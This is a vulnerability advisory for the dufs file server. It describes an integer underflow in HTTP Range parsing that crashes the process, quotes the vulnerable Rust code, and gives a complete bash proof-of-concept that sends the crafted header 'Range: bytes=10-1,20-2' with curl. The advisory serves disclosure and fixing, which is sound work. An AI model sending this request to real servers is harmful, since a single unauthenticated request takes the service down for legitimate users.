---
lang: en
title: "Integer Underflow in Multipart Range Parsing Allows Remote DoS via Memory Exhaustion"
project: dufs
cwe:
  - CWE-191
  - CWE-789
severity: high
cvss: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
score: "8.7"
verified: "v0.45.0"
affected: "<= v0.45.0"
patched:
date: 2026-03-30
---

### Summary

A vulnerability involving an **Integer Underflow** exists in the HTTP `Range` header parsing logic of Dufs (v0.45.0 and earlier).
When an attacker sends a request with an invalid range where the **start position exceeds the end position**, such as `Range: bytes=500-1`, an underflow of an unsigned 64-bit integer (`u64`) occurs in the internal server calculation $range\_size = end - start + 1$. As a result, `range_size` is calculated as an extremely large positive number, **approximately 18 exabytes**.
Furthermore, when this is triggered in a `Multipart Range` request, the process will **Panic** and crash, even in a `Release` build.

### Details

- **Verified version**: dufs v0.45.0

The `parse_range()` function at `utils.rs:101` only checks `end < size` at `utils.rs:124-125` and does not verify if `start <= end`.
In addition, there is a test gap; the `test_parse_range()` function at `utils.rs:168` lacks test cases for reversed ranges (start > end).
Therefore, by specifying a reversed range such as `Range: bytes=10-1` or `bytes=10-1,20-2`, the input bypasses `parse_range()` and causes a `u64` underflow in the calculation $end - start + 1$ later within `handle_send_file()`.
In the **Single Range** processing path (`ranges.len() == 1`), although an abnormally large `Content-Length` is generated, it does not lead to immediate memory exhaustion because it is handled via streaming using `LengthLimitedStream`. However, in the **Multipart Range** processing path (the `else` block), the application attempts to allocate a vector of the massive, underflowed size all at once via `let mut buffer = vec![0; range_size as usize];`.
As a result, even during a `release` build execution, it triggers a **capacity overflow** in the standard library, leading to a panic and a remote DoS that forces the entire process to crash.

**Input receiver: utils.rs > parse_range(): 124-125**

```rust
pub fn parse_range(range: &str, size: u64) -> Option<Vec<(u64, u64)>> {
    let (unit, ranges) = range.split_once('=')?;
    if unit != "bytes" {
        return None;
    }

    let mut result = Vec::new();
    for range in ranges.split(',') {
        let (start, end) = range.trim().split_once('-')?;
        if start.is_empty() {
            let offset = end.parse::<u64>().ok()?;
            if offset <= size {
                result.push((size - offset, size - 1));
            } else {
                return None;
            }
        } else {
            let start = start.parse::<u64>().ok()?;
            if start < size {
                if end.is_empty() {
                    result.push((start, size - 1));
                } else {
                    let end = end.parse::<u64>().ok()?;
                    // Only end < size is verified, start <= end is not verified
                    if end < size {
                        result.push((start, end));
                    } else {
                        return None;
                    }
                }
            } else {
                return None;
            }
        }
    }

    Some(result)
}
```

At `server.rs:884`, `range_size = end - start + 1` is calculated. This causes the underflow.

**Usage in Single Range: server.rs > Impl Server{} > handle_send_file(): 884**

```rust
    async fn handle_send_file(
        &self,
        path: &Path,
        headers: &HeaderMap<HeaderValue>,
        head_only: bool,
        res: &mut Response,
    ) -> Result<()> {
	//...
        if let Some(ranges) = ranges {
            if let Some(ranges) = ranges {
                if ranges.len() == 1 {
                    let (start, end) = ranges[0];
                    file.seek(SeekFrom::Start(start)).await?;
                    // Single Range
                    let range_size = end - start + 1;
                    *res.status_mut() = StatusCode::PARTIAL_CONTENT;
                    let content_range = format!("bytes {start}-{end}/{size}");
                    res.headers_mut()
                        .insert(CONTENT_RANGE, content_range.parse()?);
                    res.headers_mut()
                        .insert(CONTENT_LENGTH, format!("{range_size}").parse()?);
                    if head_only {
                        return Ok(());
                    }
                    let stream_body = StreamBody::new(
                        LengthLimitedStream::new(file, range_size as usize)
                            .map_ok(Frame::data)
                            .map_err(|err| anyhow!("{err}")),
                    );
                    let boxed_body = stream_body.boxed();
                    *res.body_mut() = boxed_body;
                } else {
				//...
                }
            } else {
                *res.status_mut() = StatusCode::RANGE_NOT_SATISFIABLE;
                res.headers_mut()
                    .insert(CONTENT_RANGE, format!("bytes */{size}").parse()?);
            }
        } else {
            res.headers_mut()
                .insert(CONTENT_LENGTH, format!("{size}").parse()?);
            if head_only {
                return Ok(());
            }

            let reader_stream = ReaderStream::with_capacity(file, BUF_SIZE);
            let stream_body = StreamBody::new(
                reader_stream
                    .map_ok(Frame::data)
                    .map_err(|err| anyhow!("{err}")),
            );
            let boxed_body = stream_body.boxed();
            *res.body_mut() = boxed_body;
        }
        Ok(())
    }
```

In the **Multi Range** path, the same underflow occurs at line **909**, identical to the **Single Range** process. However, because the subsequent processing at line **915** uses `let mut buffer = vec![0; range_size as usize];`, memory allocation fails, resulting in a **Panic**.

**Usage in Multi Range: server.rs > Impl Server{} > handle_send_file(): 909-915**

```rust
    async fn handle_send_file(
        &self,
        path: &Path,
        headers: &HeaderMap<HeaderValue>,
        head_only: bool,
        res: &mut Response,
    ) -> Result<()> {
	//...
        if let Some(ranges) = ranges {
            if let Some(ranges) = ranges {
                if ranges.len() == 1 {
					//...
                } else {
                    *res.status_mut() = StatusCode::PARTIAL_CONTENT;
                    let boundary = Uuid::new_v4();
                    let mut body = Vec::new();
                    let content_type = get_content_type(path).await?;
                    for (start, end) in ranges {
                        file.seek(SeekFrom::Start(start)).await?;
                        // Performs the same calculation in Multipart Range (Multipart range_size: 18446744073709551608)
                        let range_size = end - start + 1;
                        let content_range = format!("bytes {start}-{end}/{size}");
                        let part_header = format!(
                            "--{boundary}\r\nContent-Type: {content_type}\r\nContent-Range: {content_range}\r\n\r\n",
                        );
                        body.extend_from_slice(part_header.as_bytes());
                        // Allocates vector space (Attempts to allocate space of the underflowed size, leading to Panic)
                        let mut buffer = vec![0; range_size as usize];
                        file.read_exact(&mut buffer).await?;
                        body.extend_from_slice(&buffer);
                        body.extend_from_slice(b"\r\n");
                    }
                    body.extend_from_slice(format!("--{boundary}--\r\n").as_bytes());
                    res.headers_mut().insert(
                        CONTENT_TYPE,
                        format!("multipart/byteranges; boundary={boundary}").parse()?,
                    );
                    res.headers_mut()
                        .insert(CONTENT_LENGTH, format!("{}", body.len()).parse()?);
                    if head_only {
                        return Ok(());
                    }
                    *res.body_mut() = body_full(body);
                }
            } else {
                *res.status_mut() = StatusCode::RANGE_NOT_SATISFIABLE;
                res.headers_mut()
                    .insert(CONTENT_RANGE, format!("bytes */{size}").parse()?);
            }
        } else {
            res.headers_mut()
                .insert(CONTENT_LENGTH, format!("{size}").parse()?);
            if head_only {
                return Ok(());
            }

            let reader_stream = ReaderStream::with_capacity(file, BUF_SIZE);
            let stream_body = StreamBody::new(
                reader_stream
                    .map_ok(Frame::data)
                    .map_err(|err| anyhow!("{err}")),
            );
            let boxed_body = stream_body.boxed();
            *res.body_mut() = boxed_body;
        }
        Ok(())
    }
```

### PoC

**Testing Environment:**

- dufs v0.45.0
- Linux (Any distribution)

```shell
#!/bin/bash
set -e

# PoC: Integer Underflow in Multipart Range Parsing Allows Remote DoS via Memory Exhaustion
# Tested: dufs v0.45.0

ROOT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
HOST=${HOST:-127.0.0.1}
PORT=${PORT:-8888}
BIN=${BIN:-"$ROOT_DIR/target/release/dufs"}
TEST_ROOT=${TEST_ROOT:-"$ROOT_DIR/test_root"}
TARGET_FILE=${TARGET_FILE:-"$TEST_ROOT/test.txt"}
LOG_FILE=${LOG_FILE:-"$ROOT_DIR/dufs-poc-range-dos.log"}
PANIC_LOG=${PANIC_LOG:-"$ROOT_DIR/dufs-poc-range-dos.stderr.log"}
URL="http://$HOST:$PORT/$(basename "$TARGET_FILE")"

if [ ! -x "$BIN" ]; then
  echo "[+] release binary not found, building..."
  (cd "$ROOT_DIR" && cargo build --release)
fi

mkdir -p "$TEST_ROOT"

if [ ! -f "$TARGET_FILE" ] || [ "$(wc -c < "$TARGET_FILE")" -lt 1024 ]; then
  : > "$TARGET_FILE"
  i=0
  while [ "$i" -lt 300 ]; do
    printf 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\n' >> "$TARGET_FILE"
    i=$((i + 1))
  done
fi

echo "[+] target file: $TARGET_FILE ($(wc -c < "$TARGET_FILE") bytes)"

cleanup() {
  if [ -n "${SERVER_PID:-}" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

rm -f "$PANIC_LOG"
"$BIN" "$TEST_ROOT" --port "$PORT" --log-file "$LOG_FILE" >/dev/null 2>"$PANIC_LOG" &
SERVER_PID=$!

sleep 1
if ! kill -0 "$SERVER_PID" 2>/dev/null; then
  echo "[-] server failed to start"
  exit 1
fi

echo "[+] server started: pid=$SERVER_PID, url=$URL"
echo

echo "[1/3] baseline request (normal range)"
curl -i -sS -H 'Range: bytes=0-9' "$URL" | sed -n '1,10p'
echo

echo "[2/3] reversed single range"
curl -i -sS -H 'Range: bytes=10-1' "$URL" | sed -n '1,10p'
echo

echo "[3/3] reversed multipart range (DoS trigger)"
set +e
CURL_OUT=$(curl -i -sS -H 'Range: bytes=10-1,20-2' "$URL" 2>&1)
CURL_RC=$?
set -e
printf '%s\n' "$CURL_OUT" | sed -n '1,30p'
echo "curl exit code: $CURL_RC"
echo

sleep 1
if kill -0 "$SERVER_PID" 2>/dev/null; then
  echo "[-] server is still alive; PoC did not crash this run"
  exit 1
fi

echo "[+] server crashed after crafted multipart range (PoC reproduced)"
if [ -s "$PANIC_LOG" ]; then
  echo "[+] panic stderr (tail):"
  tail -n 20 "$PANIC_LOG"
fi
```

### Impact

- **High Severity Remote Denial of Service (DoS)**:
  An unauthenticated remote attacker can instantly crash the Dufs server process simply by sending a crafted multipart `Range` header against any readable file.
- **Default Configuration Vulnerability**:
  No additional configuration, such as `--allow-upload`, is required. The attack is viable even on servers running with the default read-only configuration, provided at least one exposed file exists.
- **Process Termination (OOM/Panic)**:
  An abnormal memory allocation request of approximately 18 exabytes (`capacity overflow`) triggers a Rust panic, resulting in an immediate and complete process termination (`core dumped`). This entirely halts the file delivery service for legitimate users.
- **Low Attack Complexity**:
  No special attack tools or complex procedures are necessary; the attack can be executed with a single standard `curl` command, making the risk of exploitation extremely high.
